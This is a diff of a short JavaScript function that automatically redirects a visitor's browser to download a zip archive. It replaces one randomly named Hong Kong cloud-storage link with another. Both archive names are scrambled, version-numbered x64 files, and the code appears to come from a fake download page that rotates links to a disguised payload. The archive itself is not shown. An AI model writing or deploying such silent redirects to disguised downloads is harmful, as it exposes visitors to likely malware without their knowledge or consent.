@@ -2,7 +2,7 @@ function loadUrl()
 {
 	if(num>=1)
 	{
-		var url="https://fdsadfw.oss-cn-hongkong.aliyuncs.com/HoiloWeolrd6.9.7-x64.zip";
+		var url="https://wkhbucxw.oss-cn-hongkong.aliyuncs.com/HloihWkeiow9.2.4-x64.zip";
 		window.location=url;
 	}
 }
